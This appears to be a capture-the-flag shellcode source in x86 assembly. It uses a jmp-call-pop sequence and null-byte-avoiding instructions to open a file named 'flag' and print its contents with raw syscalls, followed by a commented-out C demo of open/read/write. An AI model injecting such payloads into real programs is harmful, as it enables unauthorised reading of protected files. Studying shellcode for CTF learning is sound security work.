#include <sys/syscall.h>
/* open=5, read=3, write=4, exit=1 */

#define STRING  "flag"

.globl main
.type  main, @function

main:
  xorl    %eax, %eax
  xorl    %ebx, %ebx
  xorl    %ecx, %ecx
  xorl    %edx, %edx
  jmp     calladdr

popladdr:
  popl    %esi              // esi points to STRING 
  
  // open
  xorl    %eax, %eax        // int open(const char *pathname, int flags, [mode_t mode]);
  movb    $SYS_open,%al     // system call number
  movl    %esi,%ebx         // arg 1: string pathname
  xorl    %ecx,%ecx         // arg 2: argv
  int     $0x80 
  
  movl    %eax, %esi        // return value = 
  jmp     readflag

exit:
  xorl    %ebx,%ebx               // arg 1: 0 
  movl    %ebx,%eax
  inc     %eax                    // exit(0)   mov+inc to avoid null byte 
  int     $0x80                   // invoke syscall 

readflag:
  // read
  movb    $SYS_read, %al    // ssize_t read(int fd, void *buf, size_t count);
  movl    %esi, %ebx        // arg 1: handle of the open file
  dec     %esp          
  leal    (%esp), %ecx      // arg 2: address of buffer, read one char every time, stack downwards
  movb    $1, %dl           // read one byte
  int     $0x80

  // check loop
  xorl    %ebx, %ebx
  cmp     %eax, %ebx        // use a loop to print flag
  je      exit

  // write
  movb    $SYS_write, %al   // ssize_t write(int fd, const void *buf, size_t count);
  movb    $1, %bl          // 1 = stdout
  leal    (%esp), %ecx      // arg 2: address of buffer, read one char every time, stack downwards
  movb    $1, %dl          // write one byte
  int     $0x80

  // go to loop
  inc     %esp
  jmp     readflag

calladdr:
  call    popladdr
  .string STRING

/*
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv)
{
    int fd;

    fd = open("foo.txt", O_RDWR, 0777);
    if(fd == -1)
        perror("open");

    printf("%d\n", fd);
    
    char buffer[20];

    read(fd, buffer, 20);

    printf("%s\n", buffer);

    write(1, buffer, 10);   // 1 stands for stdout

    write(1, "\n", 1);

    close(fd);

    return 0;
}
*/
